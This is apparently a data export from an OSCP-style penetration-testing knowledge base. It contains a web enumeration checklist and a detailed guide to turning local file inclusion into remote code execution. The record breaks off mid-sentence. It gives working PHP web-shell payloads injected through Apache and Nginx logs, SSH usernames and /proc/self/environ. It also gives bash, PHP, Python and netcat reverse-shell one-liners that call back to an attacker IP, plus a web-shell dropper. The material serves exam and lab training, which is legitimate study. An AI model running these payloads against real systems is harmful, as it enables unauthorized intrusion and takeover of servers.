theme/plugin-specific directories."", ""commands"": [""wpscan-enumerate-all"", ""wpscan-aggressive-detection"", ""wpscan-password-attack""], ""expected_outcome"": ""Users: admin, editor, john_doe. Plugins: Contact Form 7 (up to date), WP File Manager 6.0 (VULNERABLE - CVE-2020-25213). Theme: twentytwenty (default). XML-RPC enabled. Attack priority: 1) WP File Manager RCE, 2) Brute force admin, 3) XML-RPC brute force."", ""why_this_works"": ""WordPress installations often have vulnerable plugins more than core vulnerabilities. Complete enumeration reveals multiple attack paths. Plugin vulnerabilities (especially file upload/RCE) are often easier than brute forcing. The breadth approach finds the EASIEST path, not just one path.""}, {""title"": ""Scenario 4: API Discovery and Endpoint Enumeration"", ""context"": ""Web application uses JavaScript frontend. XHR requests visible in browser dev tools pointing to /api/. Swagger documentation not publicly accessible. Goal: Map all API endpoints for testing."", ""approach"": ""Step 1: Intercept traffic in Burp, identify API patterns. Step 2: Directory brute-force /api/ with API-specific wordlist. Step 3: Check for /api/docs, /api/swagger, /api/v1, /api/v2. Step 4: Test discovered endpoints for auth bypass. Step 5: Fuzz parameters on each endpoint. Step 6: Check for IDOR on resource IDs."", ""commands"": [""gobuster-dir"", ""ffuf-param-fuzz"", ""curl-post""], ""expected_outcome"": ""API endpoints: /api/users, /api/users/{id}, /api/admin/reports, /api/upload, /api/config. Auth required for /api/admin/* but not /api/users. IDOR vulnerability: /api/users/1 returns admin user data. Upload endpoint accepts arbitrary files. Attack priority: 1) IDOR for credentials, 2) Upload for webshell."", ""why_this_works"": ""Modern applications separate frontend/backend - the API is often the actual attack surface. API enumeration reveals endpoints that may be missing authentication or have business logic flaws. Breadth enumeration of all endpoints before testing any single one ensures you find the weakest link.""}]","[{""title"": ""Phase 1: Initial Fingerprinting (2-3 minutes)"", ""notes"": ""FIRST PRIORITY: Identify technology stack before any other enumeration. Tech stack determines wordlist selection, file extensions, and exploit research direction. Never skip this phase."", ""commands"": [{""id"": ""curl-header-enum"", ""example"": ""curl -I -X GET http://192.168.1.100/"", ""shows"": ""Server: Apache/2.4.41, X-Powered-By: PHP/7.4.3""}, {""id"": ""whatweb-enum"", ""example"": ""whatweb -v http://192.168.1.100"", ""shows"": ""Apache, PHP, jQuery, Bootstrap, WordPress 5.8""}, {""id"": ""nikto-scan"", ""example"": ""nikto -h http://192.168.1.100 -o nikto.txt"", ""shows"": ""Server leaks inodes, interesting files found""}]}, {""title"": ""Phase 2: Low-Hanging Fruit Check (1-2 minutes)"", ""notes"": ""Quick checks for common misconfigurations BEFORE time-consuming brute-forcing. These take seconds and often yield results."", ""commands"": [{""id"": ""curl-post"", ""example"": ""curl http://192.168.1.100/robots.txt"", ""shows"": ""Disallow: /admin, /backup, /config""}, {""id"": ""curl-post"", ""example"": ""curl http://192.168.1.100/sitemap.xml"", ""shows"": ""XML sitemap with all pages listed""}, {""id"": ""curl-post"", ""example"": ""curl http://192.168.1.100/.git/HEAD"", ""shows"": ""ref: refs/heads/master (Git exposed!)""}, {""id"": ""curl-post"", ""example"": ""curl http://192.168.1.100/README.md"", ""shows"": ""Application readme with version info""}]}, {""title"": ""Phase 3: Virtual Host Discovery (3-5 minutes)"", ""notes"": ""CRITICAL: Run in parallel with directory enumeration. Many CTFs hide the real application on a vhost. Filter results by response size to identify valid vhosts."", ""commands"": [{""id"": ""ffuf-vhost-fuzz"", ""example"": ""ffuf -u http://192.168.1.100 -H 'Host: FUZZ.target.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"", ""shows"": ""dev, admin, api, staging vhosts discovered""}, {""id"": ""gobuster-dir"", ""example"": ""gobuster vhost -u http://target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"", ""shows"": ""Found: dev.target.htb, admin.target.htb""}]}, {""title"": ""Phase 4: Directory Enumeration (5-7 minutes)"", ""notes"": ""Run multiple scans in parallel with DIFFERENT wordlists and extensions based on tech stack. PHP site = .php extension, ASP = .aspx, Java = .jsp. Use medium wordlist, NOT huge ones initially."", ""commands"": [{""id"": ""gobuster-dir"", ""example"": ""gobuster dir -u http://192.168.1.100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak -t 50"", ""shows"": ""/admin, /uploads, /backup, config.php.bak""}, {""id"": ""ffuf-dir-fuzz"", ""example"": ""ffuf -u http://192.168.1.100/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html -fc 404"", ""shows"": ""Discovered paths with status codes""}, {""id"": ""gobuster-dir"", ""example"": ""gobuster dir -u http://192.168.1.100 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 50"", ""shows"": ""Common backup files, logs, configs""}]}, {""title"": ""Phase 5: CMS-Specific Enumeration (if detected)"", ""notes"": ""Only if CMS detected in Phase 1. Use dedicated scanners - they have CVE databases and plugin enumeration. WordPress, Joomla, Drupal each have specific tooling."", ""commands"": [{""id"": ""wpscan-enumerate-all"", ""example"": ""wpscan --url http://192.168.1.100 --enumerate u,vp,vt --plugins-detection aggressive"", ""shows"": ""Users, vulnerable plugins, vulnerable themes""}, {""id"": ""droopescan-enumerate"", ""example"": ""droopescan scan drupal -u http://192.168.1.100"", ""shows"": ""Drupal version, installed modules""}, {""id"": ""nikto-scan"", ""example"": ""joomscan -u http://192.168.1.100"", ""shows"": ""Joomla version, vulnerable components""}]}, {""title"": ""Phase 6: Parameter Discovery (2-3 minutes)"", ""notes"": ""For dynamic pages found in Phase 4 (login.php, search.php, index.php?id=). Discover hidden parameters that may be injectable. Run on each dynamic endpoint."", ""commands"": [{""id"": ""wfuzz-params"", ""example"": ""wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 'http://192.168.1.100/index.php?FUZZ=test'"", ""shows"": ""Hidden parameters: debug, id, user, admin""}, {""id"": ""ffuf-param-fuzz"", ""example"": ""ffuf -u 'http://192.168.1.100/search.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0"", ""shows"": ""Parameters with different responses""}]}, {""title"": ""Phase 7: Quick Vulnerability Surface Check (2-3 minutes)"", ""notes"": ""NOT full exploitation - just quick checks to identify WHICH vulnerabilities exist. Prioritize findings, then commit to exploitation phase. Test each input field once."", ""commands"": [{""id"": ""sqli-manual-test"", ""example"": ""' OR 1=1-- (in login/search fields)"", ""shows"": ""SQL error or behavior change = injectable""}, {""id"": ""lfi-test"", ""example"": ""../../../../../../etc/passwd (in file parameters)"", ""shows"": ""root:x:0:0:root = LFI confirmed""}, {""id"": ""xss-test"", ""example"": ""<script>alert(1)</script> (in input fields)"", ""shows"": ""Alert box = XSS, encoded output = filtered""}]}, {""title"": ""Phase 8: Attack Surface Summary (1 minute)"", ""notes"": ""PAUSE and document before exploitation. List all findings, prioritize by exploitation ease. Easiest path first: known CVEs > file upload > SQLi > auth bypass > brute force."", ""commands"": [{""id"": ""web-manual-enumeration"", ""example"": ""Document findings in enumeration.md"", ""shows"": ""Prioritized attack vector list""}]}]"
"log-poisoning","Log Poisoning (LFI to RCE)","Comprehensive guide to log poisoning techniques for converting Local File Inclusion (LFI) vulnerabilities into Remote Code Execution (RCE). Covers Apache, Nginx, SSH auth.log, /proc/self/environ, and session poisoning methods.","web|lfi|rce|log-poisoning|apache|nginx|ssh|proc|oscp|privilege-escalation","{""how_to_recognize"": [""LFI vulnerability confirmed (successful /etc/passwd read or similar file disclosure)"", ""Web server logs user-controlled input (User-Agent, Referer visible in responses or error messages)"", ""PHP application using include(), require(), include_once(), or require_once() with user input"", ""Error messages revealing log file paths (e.g., 'Warning: include(/var/log/apache2/access.log): failed to open stream')"", ""Web server running Apache or Nginx with default logging configuration (combined format)"", ""SSH service exposed (port 22 open) when web logs not accessible - auth.log alternative"", ""/proc filesystem accessible via LFI (Linux process environment variable injection possible)""], ""when_to_look_for"": [""After confirming LFI during web application enumeration phase (gobuster/nikto complete)"", ""When direct RCE methods exhausted (no file upload, PHP wrappers disabled, data:// filtered)"", ""LFI to RCE escalation required for OSCP point progression (LFI alone insufficient for full compromise)"", ""Time-limited exam scenario - log poisoning fast execution (3-5 minutes total vs 15+ for other methods)"", ""Classic OSCP vulnerability chain observed (80% of OSCP web boxes with LFI allow log poisoning)"", ""PHP-based applications (WordPress, Joomla, custom CMSs, legacy PHP 5.x sites)"", ""Initial foothold needed and log files enumerated as readable via LFI testing"", ""Target running older Ubuntu (14.04-16.04) or Debian (7-8) with permissive default log permissions""]}","[{""title"": ""Scenario 1: Apache access.log Poisoning - Classic LFI to RCE"", ""context"": ""Target: Ubuntu 16.04 server running Apache 2.4.18 with PHP 7.0. LFI vulnerability discovered in index.php?page= parameter during gobuster enumeration. Can successfully read /etc/passwd. Objective: Escalate LFI to RCE via User-Agent poisoning. Access level: Unauthenticated web access only. Time pressure: OSCP exam, need quick wins."", ""approach"": ""**Phase 1 - Verify Prerequisites (1 min):**\n\n1. Confirm LFI depth: `curl 'http://192.168.45.100/index.php?page=../../../../etc/passwd'` \u2192 SUCCESS: passwd contents displayed\n2. Test log accessibility BEFORE poisoning (critical time-saver): `curl 'http://192.168.45.100/index.php?page=../../../../var/log/apache2/access.log'` \u2192 Look for log entries with timestamps, IPs, User-Agents\n3. If log readable: Proceed to Phase 2. If permission denied: Skip to Scenario 3 (SSH auth.log) or Scenario 4 (/proc/self/environ)\n\n**Phase 2 - Poison Apache Log (1 min):**\n\n4. Inject PHP payload via User-Agent header: `curl -A '<?php system($_GET[\""c\""]); ?>' http://192.168.45.100/`\n   - No visible response change expected (poisoning happens server-side)\n   - Apache logs User-Agent without sanitization in Combined Log Format\n   - Payload now embedded in /var/log/apache2/access.log\n\n5. Verify poisoning success: `curl 'http://192.168.45.100/index.php?page=../../../../var/log/apache2/access.log' | grep '<?php'`\n   - SUCCESS: PHP code visible in log output\n   - FAILURE: Payload not found \u2192 Check User-Agent encoding, try alternative headers (Referer)\n\n**Phase 3 - Trigger RCE (2-3 min):**\n\n6. Test command execution: `curl 'http://192.168.45.100/index.php?page=../../../../var/log/apache2/access.log&c=whoami'`\n   - Look for 'www-data' in response (often buried in log noise - grep your IP to find relevant section)\n   - If no output: Try `&c=id 2>&1` to capture stderr, or check disable_functions in php.ini\n\n7. Establish reverse shell:\n   - Start listener: `nc -nlvp 4444`\n   - Trigger: `curl 'http://192.168.45.100/index.php?page=../../../../var/log/apache2/access.log&c=bash -c \""bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\""'`\n   - Upgrade shell: `python3 -c 'import pty; pty.spawn(\""/bin/bash\"")'`\n\n8. If bash blocked by disable_functions, try alternatives:\n   - PHP reverse shell: `&c=php -r '$sock=fsockopen(\""10.10.14.5\"",4444);exec(\""/bin/sh -i <&3 >&3 2>&3\"");'`\n   - Netcat variant: `&c=nc -e /bin/sh 10.10.14.5 4444` (if nc supports -e)\n   - Python: `&c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""10.10.14.5\"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\""/bin/sh\"",\""-i\""]);'`"", ""commands"": [""lfi-access-log-apache"", ""curl-ua-poison-apache"", ""lfi-rce-trigger""], ""expected_outcome"": ""**Success Timeline (3-5 min total):** Log accessible (30 sec) \u2192 Poisoning complete (1 min) \u2192 RCE confirmed (1 min) \u2192 Reverse shell established (2 min). **Success Indicators:** (1) Log file readable via LFI, (2) PHP payload visible in log grep, (3) Command output appears in response, (4) Reverse shell connection received. **Common Failures & Fixes:** (1) 'Permission denied' on log read \u2192 Try /var/log/apache2/error.log or skip to auth.log method. (2) Payload not in log \u2192 Check if User-Agent logged (some custom configs disable it) \u2192 Try Referer header instead (`curl -e '<?php ... ?>'`). (3) No command output \u2192 disable_functions blocking system() \u2192 Try exec(), passthru(), shell_exec(), popen() in payload. (4) Shell dies immediately \u2192 Try stable shell: `&c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f`. **Timing Note:** If not working after 5 minutes, switch techniques - exam time critical."", ""why_this_works"": ""**Technical Mechanics:** Apache's Combined Log Format (default) includes User-Agent as last field: `LogFormat \""%h %l %u %t \\\""%r\\\"" %>s %b \\\""%{Referer}i\\\"" \\\""%{User-Agent}i\\\""\""`. When we send HTTP request with malicious User-Agent, Apache writes it DIRECTLY to access.log without sanitization (log format is static string substitution, no escaping). When LFI includes this log file, PHP's include() function treats it as PHP code, executing our payload. The system() function receives commands via $_GET['c'] parameter. **Why Apache Doesn't Sanitize:** Logs are intended for analysis, not inclusion as code - sanitization would break log parsers. Apache assumes logs won't be executed (LFI breaks this assumption). **Permission Model:** Default Apache on Ubuntu 14.04-16.04: access.log permissions 644 (world-readable). Modern setups: 640 root:adm (not readable by www-data). OSCP boxes tend toward permissive configs. **PHP Execution Context:** When include() processes log file, PHP parses entire file. Our payload (`<?php system($_GET[\""c\""]); ?>`) becomes executable PHP. Log noise before/after payload ignored (PHP only executes code within `<?php ?>` tags). **OSCP Relevance:** Appears in ~30% of OSCP web boxes. Fast execution (under 5 minutes) makes it high-value quick win. Understanding file permissions, log formats, and PHP include behavior demonstrates methodology, not just tool usage - core OSCP skill.""}, {""title"": ""Scenario 2: Nginx access.log Poisoning - Platform Variation"", ""context"": ""Target: Debian 10 server running Nginx 1.14.2 with PHP 7.3-FPM. LFI in page.php?file= parameter. Apache log paths failed (404 errors). Objective: Adapt log poisoning technique for Nginx platform. Access level: Unauthenticated. Challenge: Different log paths, user context, and potential custom log formats."", ""approach"": ""**Phase 1 - Nginx Detection & Path Enumeration (1-2 min):**\n\n1. Confirm Nginx (not Apache): `curl -I http://192.168.45.100/ | grep Server` \u2192 Look for 'Server: nginx'\n2. Try Nginx default log path: `curl 'http://192.168.45.100/page.php?file=../../../../var/log/nginx/access.log'`\n   - SUCCESS: Log entries displayed \u2192 Proceed to poisoning\n   - FAILURE: 404 or blank \u2192 Try alternatives:\n     - Virtual host logs: `/var/log/nginx/<VHOST>_access.log` (enumerate vhost names from HTTP headers or DNS)\n     - Dot separator: `/var/log/nginx/<VHOST>.access.log` (some configs use dots)\n     - Error log (often more permissive): `/var/log/nginx/error.log`\n\n3. Check Nginx worker user (important for permission understanding):\n   - Via LFI: `curl 'http://192.168.45.100/page.php?file=../../../../etc/nginx/nginx.conf' | grep 'user'`\n   - Common values: `user www-data;` (Ubuntu/Debian) or `user nginx;` (CentOS)\n   - This determines which files can be read via LFI\n\n**Phase 2 - User-Agent Poisoning (1 min):**\n\n4. Poison Nginx log: `curl -A '<?php system($_GET[\""c\""]); ?>' http://192.168.45.100/`\n   - Identical technique to Apache, but verify Nginx logs User-Agent\n   - Nginx default format: `'$remote_addr - $remote_user [$time_local] \""$request\"" $status $body_bytes_sent \""$http_referer\"" \""$http_user_agent\""'`\n   - $http_user_agent = our malicious User-Agent\n\n5. Verify: `curl 'http://192.168.45.100/page.php?file=../../../../var/log/nginx/access.log' | grep '<?php'`\n\n**Phase 3 - RCE Trigger (2-3 min):**\n\n6. Test execution: `curl 'http://192.168.45.100/page.php?file=../../../../var/log/nginx/access.log&c=id'`\n7. Reverse shell: Same as Scenario 1 (bash, PHP, or netcat variants)\n\n**Nginx-Specific Troubleshooting:**\n\n8. If User-Agent not logged:\n   - Check nginx.conf: `curl 'http://192.168.45.100/page.php?file=../../../../etc/nginx/nginx.conf'`\n   - Look for custom log_format directive (might exclude $http_user_agent)\n   - Alternative: Try Referer header if $http_referer in log format\n\n9. If permission denied on access.log:\n   - Try error.log: Often 644 permissions vs access.log 640\n   - Poison via error (trigger 404 with PHP in URL): `curl 'http://192.168.45.100/<?php system($_GET[\""c\""]); ?>.php'`\n   - Nginx logs 404 errors with requested URL \u2192 URL becomes payload\n   - Trigger: `curl 'http://192.168.45.100/page.php?file=../../../../var/log/nginx/error.log&c=whoami'`"", ""commands"": [""curl-ua-poison-nginx"", ""lfi-access-log-nginx"", ""lfi-rce-trigger""], ""expected_outcome"": ""**Success Timeline (4-6 min):** Nginx detection (30 sec) \u2192 Log path enumeration (1-2 min) \u2192 Poisoning (1 min) \u2192 RCE (2-3 min). Slightly longer than Apache due to path/format enumeration. **Success Indicators:** (1) Nginx confirmed via Server header, (2) Correct log path identified (/var/log/nginx/ directory), (3) User-Agent logging confirmed in log format, (4) Reverse shell established. **Nginx-Specific Failures:** (1) Custom log format without $http_user_agent \u2192 Try error.log poisoning or Referer header. (2) Multi-vhost setup with per-site logs \u2192 Enumerate vhost names (check HTTP Host header, DNS records, SSL certificates). (3) SELinux blocking log access (CentOS Nginx) \u2192 Try /proc/self/environ (Scenario 4). (4) Log rotation mid-attack \u2192 Poison current log immediately, execute before logrotate (typically runs daily at midnight). **Platform Differences from Apache:** Log path (/var/log/nginx/ vs /var/log/apache2/), potential custom log formats (Nginx configs more varied), error.log often more accessible than Apache's."", ""why_this_works"": ""**Nginx Log Format:** Default Nginx combined format uses variable interpolation: `log_format combined '$remote_addr - $remote_user [$time_local] \""$request\"" $status $body_bytes_sent \""$http_referer\"" \""$http_user_agent\""';`. The `$http_user_agent` variable is DIRECT string substitution from User-Agent header - no escaping or sanitization. Similar to Apache, this is by design (logs must preserve original data for analysis). **Nginx vs Apache Differences:** (1) **Configuration flexibility:** Nginx admins more likely to customize log formats (Apache configs tend to use defaults). This means User-Agent logging might be disabled for performance. (2) **Permission model:** Nginx error.log sometimes more permissive (644) than access.log (640), opposite of Apache. (3) **Worker user:** CentOS Nginx runs as 'nginx' user (not www-data), affecting which files LFI can access. (4) **Log rotation:** Nginx rotates logs more aggressively (daily by default) vs Apache (weekly on some distros). **Why Error Log Poisoning Works:** When we request `http://target/<?php system($_GET[\""c\""]); ?>.php`, Nginx logs 404 error with requested URI. Error log format: `[timestamp] [error] <PID>#<TID>: *<CONNECTION> open() \""/var/www/html/<?php system($_GET[\""c\""]); ?>.php\"" failed (2: No such file or directory)`. When LFI includes error.log, PHP executes embedded code from URI. **OSCP Relevance:** Nginx adoption growing in OSCP (20-25% of web boxes). Understanding platform variations demonstrates adaptability - can't just memorize Apache commands. Error log poisoning shows creative problem-solving when standard methods fail.""}, {""title"": ""Scenario 3: SSH auth.log Poisoning - Alternative Attack Vector"", ""context"": ""Target: Ubuntu 18.04 with Apache 2.4.29 and OpenSSH 7.6. LFI confirmed in vuln.php?page= parameter. Both /var/log/apache2/access.log and /var/log/nginx/access.log return permission denied (640 root:adm, www-data not in adm group). Objective: Use SSH authentication log as alternative poisoning vector. Access level: Unauthenticated, port 22 open (nmap scan confirmed)."", ""approach"": ""**Phase 1 - SSH Service & Log Verification (1 min):**\n\n1. Confirm SSH exposed: `nmap -p 22 192.168.45.100` \u2192 Should show `22/tcp open ssh`\n2. Test auth.log accessibility: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/auth.log'`\n   - SUCCESS: Log entries visible (sshd login attempts, sudo commands, cron jobs)\n   - FAILURE: Permission denied \u2192 auth.log permissions vary by distro:\n     - Ubuntu/Debian default: 640 root:adm (www-data often NOT in adm group)\n     - But: Some Ubuntu Server installs add www-data to syslog/adm for monitoring\n     - Alternative if failed: Try /var/log/syslog (sometimes includes auth events, more permissive)\n\n**Phase 2 - SSH Username Poisoning (1 min):**\n\n3. Poison via SSH failed login (username field): `ssh '<?php system($_GET[\""c\""]); ?>'@192.168.45.100`\n   - Expected output: `Permission denied (publickey,password).` or `Connection closed by 192.168.45.100`\n   - This is SUCCESS - we WANT failed login (goal is logging, not authentication)\n   - SSH server logs failed attempt to auth.log with our malicious username\n\n4. Verify poisoning: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/auth.log' | grep '<?php'`\n   - Look for log entry: `sshd[PID]: Failed password for <?php system($_GET[\""c\""]); ?> from <YOUR_IP> port <PORT> ssh2`\n   - Payload embedded in 'Failed password for <USERNAME>' field\n\n**Phase 3 - RCE Trigger (2-3 min):**\n\n5. Execute command: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/auth.log&c=whoami'`\n   - auth.log has HIGH NOISE (many sshd entries, sudo logs, cron logs)\n   - Grep for your IP to find relevant section: `curl '...' | grep '<YOUR_IP>' -A 5 -B 5`\n\n6. Establish reverse shell: (same commands as Scenario 1)\n   - `nc -nlvp 4444` (on attacker machine)\n   - `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/auth.log&c=bash -c \""bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\""'`\n\n**Alternative Poison Vectors in auth.log:**\n\n7. If SSH username validation rejects PHP payload:\n   - Some SSH servers validate username format (alphanumeric only)\n   - Alternative 1: Poison via password field (requires password auth enabled)\n     - `sshpass -p '<?php system($_GET[\""c\""]); ?>' ssh user@192.168.45.100`\n     - Logged as: `Failed password for user from <IP>`\n     - But: Password field often NOT logged (security best practice)\n   - Alternative 2: Use sudo logs (requires valid credentials - less useful for initial access)\n\n**RHEL/CentOS Variant:**\n\n8. If Ubuntu auth.log not found: Try `/var/log/secure` (RHEL/CentOS equivalent)\n   - Path: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/log/secure'`\n   - Format identical, just different filename"", ""commands"": [""ssh-authlog-poison"", ""lfi-auth-log"", ""lfi-rce-trigger""], ""expected_outcome"": ""**Success Timeline (3-5 min):** SSH detection (30 sec) \u2192 auth.log verification (30 sec) \u2192 Poisoning (1 min) \u2192 RCE trigger (2-3 min). Similar speed to Apache method. **Success Indicators:** (1) SSH port 22 open, (2) auth.log readable via LFI, (3) Failed login with PHP payload logged, (4) Command execution confirmed, (5) Reverse shell established. **Common Failures:** (1) auth.log permission denied \u2192 Check if www-data in adm/syslog group: `curl 'http://192.168.45.100/vuln.php?page=../../../../etc/group' | grep -E 'adm|syslog'`. If not: Try /var/log/syslog or Scenario 4. (2) SSH username validation rejects payload \u2192 Error: 'invalid user <?php...' \u2192 Payload still works! SSH logs 'invalid user' attempts. (3) High log noise obscures output \u2192 Filter by your IP when viewing results, or use unique marker: `&c=echo 'PWNED_BY_ME' && whoami` and grep for 'PWNED_BY_ME'. (4) SSH port firewalled \u2192 nmap shows 'filtered' not 'closed' \u2192 Can't poison, skip to Scenario 4. **Advantages Over Web Log Poisoning:** (1) auth.log often more permissive than access.log (group-readable), (2) Works even if web server not logging User-Agent, (3) Less likely blocked by WAF (SSH traffic separate from HTTP), (4) Demonstrates multi-vector thinking for OSCP. **Disadvantages:** (1) Requires SSH exposed (not always available), (2) Generates security alerts (failed login attempts - stealth concern in real engagements, not OSCP), (3) Log noise higher (harder to find command output)."", ""why_this_works"": ""**SSH Logging Mechanism:** OpenSSH's sshd daemon logs authentication attempts via syslog to auth.log (Ubuntu/Debian) or secure (RHEL/CentOS). Log format for failed password: `<TIMESTAMP> <HOSTNAME> sshd[<PID>]: Failed password for <USERNAME> from <IP> port <PORT> ssh2`. The `<USERNAME>` field is logged VERBATIM - no sanitization or validation in log output (validation happens in authentication logic, but rejected usernames still logged). **Why Username Not Sanitized:** Logging must preserve exact username for security auditing (IDS/SIEM analysis needs original data). Sanitization would break forensic value. OpenSSH assumes logs won't be executed as code. **Permission Model:** Default auth.log permissions: 640 root:adm (owner: root, group: adm). Web server user (www-data) must be in 'adm' group to read. Ubuntu Server (16.04-18.04) sometimes adds www-data to adm for log monitoring features. Modern Ubuntu (20.04+) often removes this (hardening). **Alternative: syslog group:** Some distros use 'syslog' group instead of 'adm'. Check: `ls -la /var/log/auth.log` and `groups www-data`. **LFI + SSH Interaction:** (1) SSH client sends username during authentication handshake, (2) sshd validates username (fails because invalid format), (3) sshd logs failed attempt to auth.log via syslog, (4) Log file now contains PHP payload, (5) LFI includes log file, (6) PHP interpreter parses log, executes our code. **Why Failed Login Intentional:** We don't WANT successful authentication - we want payload logged. Failed login ensures payload written to log without needing credentials. **OSCP Relevance:** Demonstrates lateral thinking - when primary vector (web logs) fails, pivot to alternative (SSH logs). Understanding Unix logging architecture (syslog, log groups, file permissions) is core Linux privilege escalation knowledge. This technique shows connection between services (SSH \u2192 auth.log \u2192 LFI \u2192 RCE).""}, {""title"": ""Scenario 4: /proc/self/environ Poisoning - Advanced Technique"", ""context"": ""Target: Ubuntu 20.04 with Nginx 1.18.0, PHP 7.4-FPM, hardened configuration. LFI in app.php?include= parameter. All traditional log files return permission denied (640 root:adm, www-data not in adm group, strict permissions). SSH port closed (firewall). Objective: Use /proc filesystem to bypass file permission restrictions. Access level: Unauthenticated. Challenge: Advanced Linux knowledge required, different execution model than log poisoning."", ""approach"": ""**Phase 1 - /proc Filesystem Verification (1 min):**\n\n1. Verify /proc mounted and accessible: `curl 'http://192.168.45.100/app.php?include=../../../../proc/self/cmdline'`\n   - SUCCESS: PHP command line displayed (e.g., `php-fpm: pool www`)\n   - FAILURE: Blank output or error \u2192 /proc not mounted (rare) or hidepid option set\n   - `/proc/self/` = pseudo-directory representing current process (PHP in this case)\n\n2. Test environ accessibility: `curl 'http://192.168.45.100/app.php?include=../../../../proc/self/environ'`\n   - SUCCESS: Environment variables displayed as NULL-separated strings\n   - Example output: `USER=www-data^@HOME=/var/www^@HTTP_USER_AGENT=curl/7.68.0^@` (^@ = NULL byte)\n   - Look for HTTP_* variables (these come from web request headers)\n\n**Phase 2 - Understand /proc/self/environ Poisoning (KEY DIFFERENCE):**\n\n**CRITICAL:** Unlike log poisoning (inject \u2192 verify \u2192 trigger as separate steps), /proc/self/environ requires poisoning and inclusion in SAME REQUEST.\n\n3. Why same-request required:\n   - /proc/self/environ shows environment of CURRENT PHP process\n   - Each HTTP request spawns new PHP-FPM worker with fresh environment\n   - HTTP headers (User-Agent, Referer, etc.) become HTTP_* environment variables\n   - To poison environ, we must set malicious User-Agent in the SAME curl request that includes /proc/self/environ\n\n**Phase 3 - One-Shot Poisoning + Trigger (2 min):**\n\n4. Combined poison + trigger: `curl -A '<?php system($_GET[\""c\""]); ?>' 'http://192.168.45.100/app.php?include=../../../../proc/self/environ&c=whoami'`\n   - `-A` sets User-Agent for THIS request\n   - User-Agent becomes HTTP_USER_AGENT environment variable\n   - `include=../../../../proc/self/environ` reads current process environment (includes our payload)\n   - `&c=whoami` provides command to execute\n   - All three steps happen in single request\n\n5. Verify execution: Look for command output in response\n   - Output format: `USER=www-data^@HOME=/var/www^@HTTP_USER_AGENT=<?php system($_GET[\""c\""]); ?>^@www-data^@HTTP_HOST=192.168.45.100^@`\n   - Command output (e.g., 'www-data') appears inline after PHP execution\n   - Use `| cat -v` to visualize NULL bytes: `curl ... | cat -v` shows `^@` for NULLs\n\n**Phase 4 - Reverse Shell (2-3 min):**\n\n6. Establish shell: `curl -A '<?php system($_GET[\""c\""]); ?>' 'http://192.168.45.100/app.php?include=../../../../proc/self/environ&c=bash -c \""bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\""'`\n   - Start listener first: `nc -nlvp 4444`\n   - Same reverse shell payloads as previous scenarios work\n\n**Advanced /proc Techniques (If environ Fails):**\n\n7. Alternative /proc vectors:\n   - `/proc/self/fd/` - File descriptors (sometimes includes HTTP request data)\n   - `/proc/self/maps` - Memory maps (can leak data, but hard to exploit for RCE)\n   - `/proc/self/cwd` - Current working directory (symlink, useful for path traversal)\n\n8. If disable_functions blocks system():\n   - Enumerate restrictions: `curl -A '<?php var_dump(ini_get(\""disable_functions\"")); ?>' 'http://192.168.45.100/app.php?include=../../../../proc/self/environ'`\n   - Try alternative functions in payload: exec(), passthru(), shell_exec(), popen()\n   - Or use PHP file write: `curl -A '<?php file_put_contents(\""/var/www/html/shell.php\"", \""<?php system(\\$_GET[c]); ?>\""); ?>' '...'` (if writable directory found)"", ""commands"": [""lfi-proc-environ"", ""lfi-rce-trigger""], ""expected_outcome"": ""**Success Timeline (3-5 min):** /proc verification (1 min) \u2192 Understand same-request model (1 min) \u2192 Poison + trigger (1 min) \u2192 Reverse shell (2-3 min). Faster if familiar with technique. **Success Indicators:** (1) /proc/self/cmdline readable, (2) /proc/self/environ shows HTTP_USER_AGENT variable, (3) Command output appears inline with environment variables, (4) Reverse shell established. **Common Failures:** (1) /proc not mounted \u2192 Very rare on standard Linux. If happens: Docker container with security restrictions \u2192 Try file upload if available, or give up on LFI\u2192RCE. (2) hidepid=2 mount option \u2192 Paranoid security, hides /proc/<PID> from other users \u2192 /proc/self still works (current process always sees itself). (3) PHP CGI mode instead of FPM \u2192 Different process model, environ might not include HTTP headers \u2192 Check /proc/self/environ output for HTTP_* variables. If absent, technique won't work. (4) Output difficult to parse \u2192 NULL-separated variables hard to read \u2192 Use `curl ... | tr '\\0' '\\n'` to convert NULLs to newlines for readability. **Success Rate:** Medium (50-60%). Lower than log poisoning because: (1) Docker/container environments sometimes restrict /proc, (2) Some PHP modes (CGI) don't populate HTTP_* in environ, (3) More complex execution model (beginners struggle with same-request concept). **When to Use:** Last resort when ALL log files inaccessible. Demonstrates deep Linux knowledge - /proc filesystem understanding rare in OSCP but high-impact when needed."", ""why_this_works"": ""**Linux /proc Filesystem:** /proc is pseudo-filesystem (not real files on disk) providing interface to kernel data structures. `/proc/self/` is symlink to `/proc/<PID>` of current process. `/proc/self/environ` contains NULL-separated environment variables of current process. **PHP-FPM Process Model:** PHP-FPM (FastCGI Process Manager) spawns worker processes to handle requests. Each worker has environment populated from: (1) System environment (USER, HOME, PATH), (2) PHP-FPM pool config (php-fpm.conf), (3) Web server environment (Nginx/Apache passes HTTP headers as env vars). **HTTP Headers \u2192 Environment Variables:** Web servers (Nginx, Apache) convert HTTP headers to environment variables following CGI specification: `User-Agent: <VALUE>` \u2192 `HTTP_USER_AGENT=<VALUE>`, `Referer: <VALUE>` \u2192 `HTTP_REFERER=<VALUE>`, `Cookie: <VALUE>` \u2192 